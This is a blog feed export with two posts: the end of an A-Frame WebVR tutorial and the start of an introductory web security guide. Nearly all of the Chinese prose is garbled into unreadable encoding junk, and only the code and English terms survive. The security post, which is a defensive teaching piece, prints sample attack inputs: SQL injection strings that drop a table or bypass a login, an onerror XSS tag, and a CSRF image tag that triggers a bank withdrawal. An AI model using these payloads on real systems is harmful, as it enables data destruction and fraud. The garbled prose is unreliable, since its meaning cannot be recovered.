Add Backgroundæˆ‘å€‘å¯ä»¥é€é &lt;a-sky&gt;&lt;/a-sky&gt; ä¾†å¢åŠ èƒŒæ™¯ï¼Œè£¡é¢å¯ä»¥å–®ç´”è¨­ç½®é¡è‰²ã€360åº¦çš„å½±ç‰‡æˆ–ç…§ç‰‡
&lt;a-sky src=&quot;http://i.imgur.com/JHZjdp6.jpg&quot;&gt;&lt;/a-sky&gt;

See the Pen webVR-test-demo2 by Arvin (@arvin0731) on CodePen.


é€™æ¨£æˆ‘å€‘å°±æœ‰ä¸€å€‹æ¼‚æµ®åœ¨åŸå¸‚ç©ºä¸­çš„åœ“æŸ±é«”äº† XD  (åœ–ç‰‡ä¾†æº)
Asset Management Systemåœ¨ A-frame è£¡é¢æœ‰å€‹ &lt;a-assets&gt;ï¼Œç”¨ä¾†ç®¡ç†æ‰€æœ‰ Entity çš„ assets è³‡æºï¼Œèˆ‡å…¶ç›´æ¥å¯«åœ¨ inline è£¡é¢åœ¨ runtime æ™‚è®€å–ï¼Œé€éå®šç¾©åœ¨ &lt;a-assets&gt; ä¸­å¯ä»¥è®“ Browser æ›´è¼•æ˜“åœ°åš cacheï¼Œè€Œ A-frame æœƒä¿è­‰åœ¨ render ä¹‹å‰å°±æŠŠé€™äº›è³‡æºéƒ½è¼‰å¥½ï¼Œå› æ­¤å®˜æ–¹å»ºè­°ä½¿ç”¨é€™ç¨®æ–¹å¼ä¾†è™•ç†åœ–ç‰‡ç­‰ assetsã€‚
ç”¨æ³•å¾ˆç°¡å–®ï¼Œåœ¨ &lt;a-assets&gt; ä¸­å®£å‘Š &lt;img&gt;ï¼Œç„¶å¾Œè¨­å®šå¥½ idï¼Œæ¥è‘—åœ¨æƒ³ä½¿ç”¨è©² asset çš„ entity ä¸­çš„ src æŒ‡å®šå°æ‡‰ id å³å¯ã€‚
&lt;a-scene&gt;  &lt;a-assets&gt;    &lt;img id=&quot;skyTexture&quot; src=&quot;http://i.imgur.com/JHZjdp6.jpg&quot;&gt;  &lt;/a-assets&gt;  &lt;a-sky src=&quot;#skyTexture&quot;&gt;&lt;/a-sky&gt;&lt;/a-scene&gt;

More entity (Ground, Light, Animation)Ground &amp; LightåŸºæœ¬çš„å ´æ™¯é™¤äº†å¤©ç©ºä»¥å¤–ï¼Œç•¶ç„¶é‚„è¦æœ‰åœ°æ¿ã€ç‡ˆå…‰ï¼Œåœ°æ¿å…¶å¯¦æœ‰å¾ˆå¤šç¨®é¸æ“‡ï¼Œå¯ä»¥ç”¨ &lt;a-plane&gt;ï¼Œä¹Ÿèƒ½ç”¨ &lt;a-cylinder&gt;ï¼Œåªè¦è¨­ç½®å°çš„é«˜åº¦è·Ÿæ–¹ä½å³å¯ã€‚ä»¥ &lt;a-plane&gt; ä¾†èªªï¼Œå› ç‚ºä»– defalut çš„è§’åº¦æ˜¯èˆ‡ XY å¹³è¡Œï¼Œå› æ­¤æˆ‘å€‘è¦å°‡ X è»¸åè½‰ä¹ååº¦ï¼Œè®“ä»–èˆ‡ XZ å¹³è¡Œï¼š
&lt;a-plane src=&quot;#groundTexture&quot; rotation=&quot;-90 0 0&quot; width=&quot;30&quot; height=&quot;30&quot;&gt;&lt;/a-plane&gt;
å¦å¤–å ´æ™¯ä¸­å¾ˆé‡è¦çš„ç‡ˆå…‰ï¼Œåœ¨ç›®å‰çš„ä¾‹å­ä¸­ï¼Œæˆ‘å€‘éƒ½æ²’æœ‰ç‰¹åˆ¥è¨­å®šï¼ŒA-frame æœƒè‡ªå·±å¹«æˆ‘å€‘å®šç¾©ä¸€å€‹ ambient light å’Œ directional lightï¼Œä¸€æ—¦æˆ‘å€‘æœ‰äº†è‡ªå·±çš„è¨­å®šï¼Œdefault å€¼å°±æœƒè¢«æ‹”æ‰ã€‚
åŸºæœ¬æœ‰å…©ç¨®ç‡ˆå…‰å¯ä»¥è¨­å®šï¼š

ambient: é‡å°æ•´å€‹ scene çš„ç‡ˆå…‰è¨­å®š
point: åƒæ˜¯ä¸€å€‹é›»ç‡ˆæ³¡ï¼Œæˆ‘å€‘å¯ä»¥èª¿æ•´å…¶ä½ç½®èˆ‡å¼·åº¦ï¼Œè®“ entity ä¸Šçš„å…‰å½±æ•ˆæœå› æ‡‰è·é›¢èˆ‡è§’åº¦çš„ä¸åŒæœ‰æ‰€è®ŠåŒ–ã€‚

&lt;a-light type=&quot;ambient&quot; color=&quot;#445451&quot;&gt;&lt;/a-light&gt;// intensity ç‚ºå¼·åº¦ 2 è·é›¢åœ¨ x y z: 2 4 4 çš„ç‡ˆæ³¡&lt;a-light type=&quot;point&quot; intensity=&quot;2&quot; position=&quot;2 4 4&quot;&gt;&lt;/a-light&gt;

AnimationA-frame æœ‰å…§å»ºçš„ animation systemï¼Œè¦ä½¿ç”¨å¾ˆç°¡å–®ï¼ŒåŠ ä¸Š &lt;a-animation&gt; å³å¯ï¼ˆæ–‡ä»¶ä¸Šå¯«èªªé€™å€‹ entity å°‡è¢«å–ä»£ï¼Œä¸éåœ¨æˆ‘å¯«æ–‡çš„ç•¶ä¸‹ï¼Œè©² issue å¾ aframe çš„ milestone æ‹”é™¤äº†ï¼Œæ‰€ä»¥é‚„éœ€è¦å†è§€å¯Ÿçœ‹çœ‹ã€‚ï¼‰
&lt;a-cylinder color=&quot;red&quot; position=&quot;0 2 -5&quot; rotation=&quot;30 45 45&quot; scale=&quot;1 1 1&quot;&gt;     &lt;a-animation attribute=&quot;rotation&quot; to=&quot;30 60 45&quot; direction=&quot;alternate&quot; dur=&quot;2000&quot;        repeat=&quot;indefinite&quot;&gt;&lt;/a-animation&gt;&lt;/a-cylinder&gt;

æ˜¯çš„ï¼ŒA-frame ä¸­çš„ entity å¯ä»¥æœ‰ childï¼Œè€Œ child æœƒæ“æœ‰ parent è¨­å®šçš„ä½ç½®èˆ‡è§’åº¦ç­‰ç­‰ï¼ŒA-frame æœƒå¹«ä½ è™•ç†å¥½ã€‚
é€™é‚Šæˆ‘å€‘çš„å‹•ç•«è®“  æ”¹è®Š rotationï¼Œåˆ° 30 60 45ï¼Œä¹Ÿå°±æ˜¯å¾€ Y è»¸è½‰å‹•åˆ° 60 åº¦ï¼Œæ–¹å‘æ˜¯ alternateï¼Œå…©ç§’å…§åšå®Œï¼Œä¸¦ä¸”ä¸æ–· repeatã€‚å¦‚æœè¦å¤šå€‹å‹•ç•«ï¼Œå°±å†åŠ ä¸Šä¸€å€‹ ã€‚
&lt;a-cylinder color=&quot;red&quot; position=&quot;0 2 -5&quot; rotation=&quot;30 45 45&quot; scale=&quot;1 1 1&quot;&gt;    &lt;a-animation attribute=&quot;rotation&quot; to=&quot;30 60 45&quot; direction=&quot;alternate&quot; dur=&quot;2000&quot;        repeat=&quot;indefinite&quot;&gt;&lt;/a-animation&gt;    &lt;a-animation attribute=&quot;position&quot; to=&quot;0 2.2 -5&quot; direction=&quot;alternate&quot; dur=&quot;2000&quot;        repeat=&quot;indefinite&quot;&gt;&lt;/a-animation&gt;&lt;/a-cylinder&gt;

ç¾åœ¨æˆ‘å€‘çš„åœ“æŸ±é«”æœƒä¸Šä¸‹å·¦å³æ—‹è½‰ç§»å‹•äº†ï¼
See the Pen webVR-test-demo3 by Arvin (@arvin0731) on CodePen.


Add user interationVR å¦‚æœä¸èƒ½äº’å‹•ï¼Œé‚„æœ‰ä»€éº¼æ„ç¾©å—ï¼Ÿ
é›–ç„¶æˆ‘å€‘æ²’æœ‰ VR è¨­å‚™ï¼Œä½† A-frame æœ‰æä¾›çµ¦ Desktop çš„é–‹ç™¼è€…ä¸€å€‹å¥½ç”¨çš„å…§å»º component &lt;a-cursor&gt;ï¼Œç”¨ä¾†æ¨¡æ“¬ controllersï¼Œæˆ‘å€‘è¦è®“ controller å›ºå®šåœ¨ camera çš„ä¸­é–“ï¼Œä¹Ÿå°±æ˜¯è·Ÿè‘—æˆ‘å€‘çš„çœ¼ç›ï¼Œåªè¦ç•¶ä½œ child æ”¾åœ¨  åº•ä¸‹å³å¯ã€‚(cursor å¯ä»¥ç›£è½çš„äº‹ä»¶åœ¨æ­¤ https://aframe.io/docs/0.5.0/components/cursor.html)
&lt;a-camera&gt;    &lt;a-cursor&gt;&lt;/a-cursor&gt;&lt;/a-camera&gt;

å¦‚æ­¤ä¸€ä¾†æˆ‘å€‘å°±å¯ä»¥ç”¨æ»‘é¼ ä¾†åšé»æ“Šçš„å‹•ä½œã€‚
è¦è®“å ´æ™¯ä¸­çš„ç‰©ä»¶è·Ÿéš¨æˆ‘å€‘çš„é»æ“Šæœ‰æ‰€åæ‡‰çš„è©±ï¼Œæœ‰å…©ç¨®åšæ³•ï¼š

Event Listener Component:  å¦‚åŒä¸€èˆ¬æˆ‘å€‘åœ¨ Web ç•¶ä¸­ä¸€æ¨£ï¼Œç”¨ javascript å» querySelector å‡º objectï¼Œæ¥è‘—åŠ ä¸Š EventListenerï¼š
  &lt;script&gt;    const cylinderEl = document.querySelector(&#x27;a-cylinder&#x27;);    cylinderEl.addEventListener(&#x27;mouseenter&#x27;, function () &#123;        cylinderEl.setAttribute(&#x27;scale&#x27;, &#123;x: 2, y: 2, z: 2&#125;);    &#125;);&lt;/script&gt;
  ä¹Ÿå¯ä»¥è¨­ç½®ä¸€å€‹ component ç„¶å¾Œ attach åˆ° Entity ä¸Šï¼š  &lt;script&gt;    AFRAME.registerComponent(&#x27;scale-on-mouseenter&#x27;, &#123;        schema: &#123;            to: &#123;default: &#x27;2.5 2.5 2.5&#x27;&#125;        &#125;,        init: function () &#123;            var data = this.data;            // åœ¨é€™é‚Šè¨­å®š listener            this.el.addEventListener(&#x27;mouseenter&#x27;, function () &#123;                this.setAttribute(&#x27;scale&#x27;, data.to);            &#125;);            this.el.addEventListener(&#x27;mouseleave&#x27;, function () &#123;                this.setAttribute(&#x27;scale&#x27;, data.leave);            &#125;);        &#125;    &#125;);&lt;/script&gt;  &lt;!-- æ›è¼‰ä¸€å€‹ sacle-on-mouseenter component ä¸Šå» --&gt;&lt;a-cylinder color=&quot;red&quot; position=&quot;0 2 -5&quot; rotation=&quot;30 100 0&quot; scale=&quot;1 1 1&quot; height=&quot;0.2&quot;    scale-on-mouseenter=&quot;to: 2.2 2.2 2.2&quot;&gt;    &lt;a-animation attribute=&quot;rotation&quot; to=&quot;30 90 90&quot; direction=&quot;alternate&quot; dur=&quot;2000&quot;    repeat=&quot;indefinite&quot;&gt;&lt;/a-animation&gt;    &lt;a-animation attribute=&quot;position&quot; to=&quot;0 2.2 -5&quot; direction=&quot;alternate&quot; dur=&quot;2000&quot;    repeat=&quot;indefinite&quot;&gt;&lt;/a-animation&gt;&lt;/a-cylinder&gt;

Animating on Event:  å¦ä¸€ç¨®æ–¹å¼å¾ˆç°¡å–®ï¼Œæ˜¯ç›´æ¥è¨­å®š Event åˆ°  ä¸Šé ­ï¼Œä½†ä½ å°±å°‘äº†ä¸€äº›è‡ªç”±æ“ä½œçš„å½ˆæ€§ï¼š  &lt;a-cylinder color=&quot;red&quot; position=&quot;0 2 -5&quot; rotation=&quot;30 100 0&quot; scale=&quot;1 1 1&quot; height=&quot;0.2&quot;    scale-on-mouseenter=&quot;to: 2.2 2.2 2.2&quot;&gt;    &lt;a-animation attribute=&quot;rotation&quot; to=&quot;30 90 90&quot; direction=&quot;alternate&quot; dur=&quot;2000&quot;    repeat=&quot;indefinite&quot;&gt;&lt;/a-animation&gt;    &lt;a-animation attribute=&quot;position&quot; to=&quot;0 2.2 -5&quot; direction=&quot;alternate&quot; dur=&quot;2000&quot;    repeat=&quot;indefinite&quot;&gt;&lt;/a-animation&gt;    &lt;a-animation attribute=&quot;scale&quot; begin=&quot;mouseenter&quot; dur=&quot;300&quot; to=&quot;2.2 2.2 2.2&quot;&gt;&lt;/a-animation&gt;    &lt;a-animation attribute=&quot;scale&quot; begin=&quot;mouseleave&quot; dur=&quot;300&quot; to=&quot;1 1 1&quot;&gt;&lt;/a-animation&gt;    &lt;a-animation attribute=&quot;rotation&quot; begin=&quot;click&quot; dur=&quot;2000&quot; to=&quot;30 405 0&quot;&gt;&lt;/a-animation&gt;&lt;/a-cylinder&gt;


ä¸­é–“çš„é»ï¼ˆcursorï¼‰ç§»å…¥èˆ‡ç§»å‡ºåœ“æŸ±é«”æ™‚æœƒæ”¾å¤§ç¸®å°ï¼Œé»æ“Šæ™‚æœƒæ—‹è½‰ï¼š
See the Pen webVR-test-demo5 by Arvin (@arvin0731) on CodePen.


åˆ°ç›®å‰ç‚ºæ­¢å­¸åˆ°çš„æ±è¥¿å…¶å¯¦å·²ç¶“è¶³å¤ æˆ‘å€‘å›å»æœ€é–‹å§‹æˆ‘æåŠçš„é‚£ç¯‡æ–‡ç«  https://css-tricks.com/minecraft-webvr-html-using-frame/ æ·±å…¥é–±è®€ï¼Œå¤§éƒ¨åˆ†çš„å…§å®¹åœ¨æˆ‘é€™ç¯‡éƒ½æœ‰æ¶µæ‹¬åˆ°äº†ï¼Œä½†é€éé–±è®€è©²ç¯‡æ–‡ç« å¯ä»¥æ›´äº†è§£å¦‚ä½•åˆ©ç”¨ reusable çš„ component è£½ä½œå‡ºä¸€å€‹ VR çš„ Minecraftï¼ä¸¦ä¸”è£¡é¢é‚„æœ‰æ•™ä½ æ€éº¼è¦è¨­ç½® Vive, Oculus çš„ controllerï¼Œå¾ˆæ¨è–¦é–±è®€ï¼
æœ€å¾Œï¼Œå†å‘Šè¨´å¤§å®¶ä¸€å€‹å¥½åº·ï¼ŒA-frame æœ‰æä¾› Inspectorgithubï¼è€Œä¸”åªè¦åœ¨ä½ çš„ html åŠ ä¸Šï¼š
&lt;a-scene inspector=&quot;url: https://aframe.io/releases/0.3.0/aframe-inspector.min.js&quot;&gt;  &lt;!-- Scene... --&gt;&lt;/a-scene&gt;

æ¥è‘—æŒ‰ä¸‹ &lt;ctrl&gt; + &lt;alt&gt; + iï¼Œå°±å¯ä»¥çœ‹åˆ°å¦‚ä¸‹ç•«é¢äº†ï¼

A-frame ä½¿ç”¨èµ·ä¾†çœŸçš„å¾ˆç°¡å–®æ–¹ä¾¿ï¼Œå¤§å®¶éƒ½ä¾†ç©ç©çœ‹å§ï¼
é€™é‚Šæœ‰ç€è¦½å™¨æ”¯æ´åº¦ï¼šhttps://webvr.rocks/
è³‡æ–™ä¾†æº
A-frame.io
Minecraft webVR using A-frame
Mozilla VR
webvr.rocks
Understanding Component-Entity-Systems

é—œæ–¼ä½œè€…ï¼š@arvinh å‰ç«¯æ”»åŸç…ï¼Œç†±æ„›æ•¸æ“šåˆ†æå’Œè³‡è¨Šè¦–è¦ºåŒ–
]]></content>
      <tags>
        <tag>webvr, A-frame</tag>
      </tags>
  </entry>
  <entry>
    <title>Web è³‡è¨Šå®‰å…¨ï¼ˆSecurityï¼‰ç°¡æ˜å…¥é–€æ•™å­¸æŒ‡å—</title>
    <url>/2016/11/05/web-security-tutorial-introduction/</url>
    <content><![CDATA[
å‰è¨€éš¨è‘—è¶Šä¾†è¶Šå¤šçš„æœå‹™å’Œè³‡æ–™é€£ä¸Šç¶²è·¯ï¼ŒWeb è³‡è¨Šå®‰å…¨å·²ç¶“æ˜¯ Web é–‹ç™¼ä¸­ä¸€å€‹é‡è¦çš„ç’°ç¯€ï¼Œç„¶è€Œè¨±å¤šé–‹ç™¼è€…å¾€å¾€å¸Œæœ›å°ˆæ³¨åœ¨æ‡‰ç”¨ç¨‹å¼çš„ç ”ç™¼ï¼Œè€Œå¿½ç•¥äº†è³‡è¨Šå®‰å…¨çš„é‡è¦æ€§ã€‚ä¸éè‹¥æ˜¯æ²’æœ‰åš´è¬¹åœ°è€ƒæ…®è³‡è¨Šå®‰å…¨çš„å•é¡Œï¼Œç­‰åˆ°äº‹æƒ…ç™¼ç”Ÿå¾Œåè€Œæœƒé€ æˆæ›´åš´é‡çš„è²¡å‹™å’Œåè­½ä¸Šçš„æå¤±ã€‚æœ¬æ–‡å¸Œæœ›æ•´ç†ä¸€äº› Web å¸¸è¦‹è³‡è¨Šå®‰å…¨ï¼ˆSecurityï¼‰çš„è­°é¡Œå’Œå­¸ç¿’è³‡æºå’Œè®€è€…ä¸€èµ·æ•™å­¸ç›¸é•·ï¼Œä¸‹æ¬¡å»ºæ§‹ç¶²è·¯æœå‹™æ™‚å¯ä»¥æ›´ç•™å¿ƒ Web çš„è³‡è¨Šå®‰å…¨ï¼Œç”šè‡³åŠªåŠ›æˆç‚ºä¸€å€‹å¥½çš„ç™½å¸½é§­å®¢ï¼ˆWhite Hat Hackerï¼‰ã€‚
å¸¸è¦‹ Web è³‡è¨Šå®‰å…¨ï¼ˆSecurityï¼‰è­°é¡Œä¸€èˆ¬è€Œè¨€ Web è³‡è¨Šå®‰å…¨ï¼ˆSecurityï¼‰éœ€è¦ç¬¦åˆä¸‰é»å®‰å…¨è¦ç´ ï¼š

ä¿å¯†æ€§ï¼šé€éåŠ å¯†ç­‰æ–¹æ³•ç¢ºä¿è³‡æ–™çš„ä¿å¯†æ€§
å®Œæ•´æ€§ï¼šè¦æ±‚ä½¿ç”¨è€…å–å¾—çš„è³‡æ–™æ˜¯å®Œæ•´ä¸å¯è¢«ç«„æ”¹çš„
å¯ç”¨æ€§ï¼šä¿è­‰ç¶²ç«™æœå‹™çš„æŒçºŒå¯è¨ªå•æ€§

ä»¥ä¸‹åˆ—å‡ºå¸¸è¦‹å½±éŸ¿ Web è³‡è¨Šå®‰å…¨ï¼ˆSecurityï¼‰çš„æ”»æ“Šæ‰‹æ³•ï¼š

SQL Injection
 ä½¿ç”¨æƒ¡æ„çš„ SQL èªæ³•å»å½±éŸ¿è³‡æ–™åº«å…§å®¹ï¼š
 // -- ç‚ºå¿½ç•¥æ‰å¾Œé¢çš„ SQL /user/profile?id=1&quot;;DROP TABLE user--SELECT * FROM USER WHERE id = &quot;1&quot;; DROP TABLE user--

 ä½¿ç”¨è€…ç™»å…¥ï¼š
 // password&quot; AND 1=1-- SELECT * FROM USER WHERE username = &quot;Mark&quot;; AND 1=1-- AND PASSWORD=&quot;1234&quot;

 ç°¡æ˜“é˜²ç¯„æ–¹å¼ï¼šä¸ä¿¡ä»»ä½¿ç”¨è€…è¼¸å…¥çš„è³‡æ–™ï¼Œç¢ºä¿ä½¿ç”¨è€…è¼¸å…¥éƒ½è¦ escape æ‰ï¼Œç›®å‰è¨±å¤šæˆç†Ÿ Web æ¡†æ¶éƒ½æœ‰æ”¯æ´ ORM æœå‹™ï¼Œå¤§éƒ¨åˆ†éƒ½åŸºæœ¬é˜²ç¯„äº† SQL Injectionã€‚

XSSï¼ˆCross-Site Scriptingï¼‰ XSS äº¦å³å°‡æƒ¡æ„ç¨‹å¼ç¢¼æ³¨å…¥åˆ°ç¶²é ï¼Œè®“çœ‹åˆ°ç¶²é çš„ä½¿ç”¨è€…æœƒå—å½±éŸ¿ï¼Œå¸¸è¦‹çš„å—ç½æˆ¶åŒ…æ‹¬è«–å£‡ã€è¨è«–å€ç­‰ç¶²è·¯æœå‹™ã€‚äº‹å¯¦ä¸Š XSS æ¦‚å¿µå¾ˆç°¡å–®ï¼Œé€éè¡¨å–®è¼¸å…¥å»ºç«‹ä¸€äº›æƒ¡æ„ç¶²å€ã€æƒ¡æ„åœ–ç‰‡ç¶²å€æˆ–æ˜¯ JavsScript ç¨‹å¼ç¢¼åœ¨ HTML ä¸­æ³¨å…¥ï¼Œç•¶ä½¿ç”¨è€…è§€çœ‹é é¢æ™‚å³æœƒè§¸ç™¼ã€‚
 &lt;IMG SRC=&quot;&quot;onerror=&quot;alert(&#x27;XSS&#x27;)&quot;&gt;

 æ›´å¤šé—œæ–¼ XSS è³‡æ–™å¯ä»¥åƒè€ƒ XSS Filter Evasion Cheat Sheetã€‚å¦å¤–ä¹Ÿæœ‰ç°¡é«”ä¸­æ–‡ç‰ˆ 
 ç°¡æ˜“é˜²ç¯„æ–¹å¼ï¼šä¸ä¿¡ä»»ä½¿ç”¨è€…è¼¸å…¥çš„è³‡æ–™ï¼Œå°‡æ‰€æœ‰è¼¸å…¥å…§å®¹ç·¨ç¢¼ä¸¦éæ¿¾ã€‚

CSRF
 CSRF è·¨ç«™è«‹æ±‚å½é€  åˆè¢«ç¨±ç‚º one-click attack æˆ–è€… session ridingï¼Œé€šå¸¸ç¸®å¯«ç‚º CSRF æˆ–è€… XSRFï¼Œ æ˜¯ä¸€ç¨®æŒ¾åˆ¶ç”¨æˆ¶åœ¨ç•¶å‰å·²ç™»å…¥çš„ Web æ‡‰ç”¨ç¨‹å¼ä¸ŠåŸ·è¡Œéæœ¬æ„çš„æ“ä½œçš„æ”»æ“Šæ–¹æ³•ã€‚
 èˆ‰ç¶­åŸºç™¾ç§‘ä¸Šçš„ä¾‹å­ï¼šå‡å¦‚ä¸€å®¶éŠ€è¡Œç”¨ä»¥åŸ·è¡Œè½‰å¸³æ“ä½œçš„URLåœ°å€å¦‚ä¸‹ï¼š 
 http://www.examplebank.com/withdraw?account=AccoutName&amp;amount=10000&amp;for=PayeeName
 é‚£éº¼ï¼Œä¸€å€‹æƒ¡æ„æ”»æ“Šè€…å¯ä»¥åœ¨å¦ä¸€å€‹ç¶²ç«™ä¸Šæ”¾ç½®å¦‚ä¸‹ä»£ç¢¼ï¼š 
 &lt;img src=&quot;http://www.examplebank.com/withdraw?account=Mark&amp;amount=10000&amp;for=Bob&quot;&gt;
 è‹¥æ˜¯ä½¿ç”¨è€…çš„ç™»å…¥è³‡è¨Šå°šæœªéæœŸçš„è©±å°±æœƒæå¤± 10000 å…ƒçš„é‡‘é¡ã€‚
 ç°¡æ˜“é˜²ç¯„æ–¹å¼ï¼š

æª¢æŸ¥ Referer æ¬„ä½ é€™æ˜¯æ¯”è¼ƒåŸºæœ¬çš„é©—è­‰æ–¹å¼ï¼Œé€šå¸¸ HTTP æ¨™é ­ä¸­æœ‰ä¸€å€‹ Referer æ¬„ä½ï¼Œå…¶æ‡‰è©²å’Œ Request ä½ç½®åœ¨åŒä¸€å€‹ç¶²åŸŸä¸‹ï¼Œå› æ­¤å¯ä»¥é€éé©—è­‰æ˜¯å¦æ˜¯åœ¨åŒä¸€å€‹ç¶²åŸŸä¾†é©—è­‰æ˜¯å¦ç‚ºæƒ¡æ„çš„è«‹æ±‚ï¼Œä½†æœƒæœ‰è¢«æ›´æ”¹å½è£çš„å¯èƒ½ã€‚

æ·»åŠ é©—è­‰ token ä¸€èˆ¬ç¾åœ¨è¨±å¤šçš„ Web Framework éƒ½æœ‰æä¾›åœ¨è¡¨å–®åŠ å…¥ç”± Server ç”Ÿæˆçš„éš¨æ©Ÿé©—è­‰ CSRF çš„ç¢¼ï¼Œå¯ä»¥å”åŠ©é˜²æ­¢ CSRF æ”»æ“Šã€‚



DoS Dos é˜»æ–·å¼æ”»æ“Šï¼ˆDenial of Service Attackï¼‰åˆç¨±ç‚ºæ´ªæ°´æ”»æ“Šï¼Œæ˜¯ä¸€ç¨®ç¶²è·¯æ”»æ“Šæ‰‹æ³•ï¼Œå…¶ç›®çš„åœ¨æ–¼ä½¿ç›®æ¨™é›»è…¦çš„ç¶²è·¯æˆ–ç³»çµ±è³‡æºè€—ç›¡ï¼Œä½¿æœå‹™æš«æ™‚ä¸­æ–·æˆ–åœæ­¢ï¼Œå°è‡´çœŸæ­£çš„ä½¿ç”¨è€…ç„¡æ³•ä½¿ç”¨æœå‹™ã€‚
 æ ¹æ“šç¶­åŸºç™¾ç§‘ï¼šDoS æ”»æ“Šå¯ä»¥å…·é«”åˆ†æˆå…©ç¨®å½¢å¼ï¼šé »å¯¬æ¶ˆè€—å‹ ä»¥åŠ è³‡æºæ¶ˆè€—å‹ï¼Œå®ƒå€‘éƒ½æ˜¯é€éå¤§é‡åˆæ³•æˆ–å½é€ çš„è«‹æ±‚å ç”¨å¤§é‡ç¶²è·¯ä»¥åŠå™¨æè³‡æºï¼Œä»¥é”åˆ°ç™±ç˜“ç¶²è·¯ä»¥åŠç³»çµ±çš„ç›®çš„ã€‚
 é »å¯¬æ¶ˆè€—æ”»æ“Šåˆåˆ†æ´ªæ³›æ”»æ“Šæˆ–æ”¾å¤§æ”»æ“Šï¼šæ´ªæ³›æ”»æ“Šçš„ç‰¹é»æ˜¯åˆ©ç”¨æ®­å±ç¨‹å¼å‚³é€å¤§é‡æµé‡è‡³å—æçš„å—å®³è€…ç³»çµ±ï¼Œç›®çš„åœ¨æ–¼å µå¡å…¶é »å¯¬ã€‚æ”¾å¤§æ”»æ“Šå’Œæ´ªæ³›æ”»æ“Šé¡ä¼¼ï¼Œæ˜¯é€šéæƒ¡æ„æ”¾å¤§æµé‡é™åˆ¶å—å®³è€…ç³»çµ±çš„é »å¯¬ï¼›å…¶ç‰¹é»æ˜¯åˆ©ç”¨æ®­å±ç¨‹å¼é€šéå½é€ çš„æº IPï¼ˆå³æ”»æ“Šç›®æ¨™ï¼‰å‘æŸäº›å­˜åœ¨æ¼æ´çš„ä¼ºæœå™¨å‚³é€è«‹æ±‚ï¼Œä¼ºæœå™¨åœ¨è™•ç†è«‹æ±‚å¾Œå‘å½é€ çš„æº IP å‚³é€æ‡‰ç­”ï¼Œç”±æ–¼é€™äº›æœå‹™çš„ç‰¹æ®Šæ€§å°è‡´æ‡‰ç­”åŒ…æ¯”è«‹æ±‚åŒ…æ›´é•·ï¼Œå› æ­¤ä½¿ç”¨å°‘é‡çš„é »å¯¬å°±èƒ½ä½¿ä¼ºæœå™¨å‚³é€å¤§é‡çš„ Response åˆ°ç›®æ¨™ä¸»æ©Ÿä¸Šã€‚
 è³‡æºæ¶ˆè€—å‹åˆåˆ†ç‚ºå”å®šåˆ†ææ”»æ“Šï¼ˆSYN floodï¼ŒSYN æ´ªæ°´ï¼‰ã€LAND attackã€CC æ”»æ“Šã€æ®­å±ç¶²è·¯æ”»æ“Šã€Application level floodsï¼ˆæ‡‰ç”¨ç¨‹å¼ç´šæ´ªæ°´æ”»æ“Šï¼‰ç­‰ã€‚
 ç°¡æ˜“é˜²ç¯„æ–¹å¼ï¼š

é˜²ç«ç‰† è¨­å®šè¦å‰‡é˜»æ“‹ç°¡å–®æ”»æ“Š

äº¤æ›æ©Ÿ å¤§å¤šäº¤æ›æ©Ÿæœ‰é™åˆ¶å­˜å–æ§åˆ¶åŠŸèƒ½

è·¯ç”±å™¨ å¤§å¤šè·¯ç”±å™¨æœ‰é™åˆ¶å­˜å–æ§åˆ¶åŠŸèƒ½

é»‘æ´å•Ÿå‹• å°‡è«‹æ±‚è½‰åˆ°ç©ºä»‹é¢æˆ–æ˜¯ä¸å­˜åœ¨çš„ä½ç½®



æª”æ¡ˆä¸Šå‚³æ¼æ´ è¨±å¤šç¶²è·¯æ‡‰ç”¨ç¨‹å¼å¯ä»¥è®“ä½¿ç”¨è€…ä¸Šå‚³æª”æ¡ˆåˆ°ä¼ºæœå™¨ç«¯ï¼Œç”±æ–¼æˆ‘å€‘ä¸çŸ¥é“ä½¿ç”¨è€…æœƒä¸Šå‚³ä»€éº¼é¡å‹çš„æª”æ¡ˆï¼Œè‹¥ä¸ç•™æ„å°±æœƒé€ æˆå¾ˆå¤§çš„å•é¡Œã€‚
 ç°¡å–®é˜²ç¯„æ–¹å¼ï¼š

é˜»æ­¢éæ³•æ–‡ä»¶ä¸Šå‚³ 

è¨­å®šæª”åç™½åå–®
æ–‡ä»¶æ¨™é ­åˆ¤æ–·


é˜»æ­¢éæ³•æ–‡ä»¶åŸ·è¡Œ 

å­˜å„²ç›®éŒ„èˆ‡ Web æ‡‰ç”¨åˆ†é›¢
å­˜å„²ç›®éŒ„ç„¡åŸ·è¡Œæ¬Šé™
æ–‡ä»¶é‡å‘½å
åœ–ç‰‡å£“ç¸®




åŠ å¯†å®‰å…¨ æœ‰è¨±å¤šçš„ç¶²è·¯æœå‹™æœ‰æä¾›æœƒå“¡è¨»å†Šçš„æœå‹™ï¼Œç•¶ä½¿ç”¨è€…ä½¿ç”¨è¨»å†Šæ™‚æ³¨æ„ä¸è¦å°‡å¯†ç¢¼æ˜ç¢¼å­˜å…¥è³‡æ–™åº«ã€‚è‹¥æ˜¯ä½ ä½¿ç”¨çš„æœå‹™æœƒåœ¨å¿˜è¨˜å¯†ç¢¼æ™‚å¯„æ˜ç¢¼å¯†ç¢¼çµ¦ä½ å¾ˆæœ‰å¯èƒ½è©²æœå‹™å°±æ˜¯ä½¿ç”¨æ˜ç¢¼åŠ å¯†ï¼Œæ­¤æ™‚å°±å¾ˆå®¹æ˜“æœƒæ¦®ç™»æˆ‘çš„å¯†ç¢¼æ²’åŠ å¯†çš„ç¶²ç«™ã€‚ä¸éå„˜ç®¡å°‡å¯†ç¢¼åŠ å¯†ä¹Ÿæœªå¿…å®‰å…¨ï¼Œåƒæ˜¯ç¶²è·¯ä¸Šå°±å­˜åœ¨ä¸€äº› ç ´è§£ç¶²ç«™ã€å½©è™¹è¡¨ å¯ä»¥ç ´è§£åŠ å¯†çš„å¯†ç¢¼ã€‚æ‰€ä»¥é€šå¸¸æˆ‘å€‘æœƒé‡å°ä¸åŒä½¿ç”¨è€…ä½¿ç”¨éš¨æ©Ÿç”¢ç”Ÿçš„ salt å­—ä¸²ä¾†åŠ é¹½å¾ŒåŠ å¯†çš„æ–¹å¼ä¾†æé«˜å¯†ç¢¼çš„å¼·å¥æ€§ã€‚
 sha3(salt + gap + password)

ç°¡æ˜“è³‡å®‰å…¥ä¾µæµç¨‹
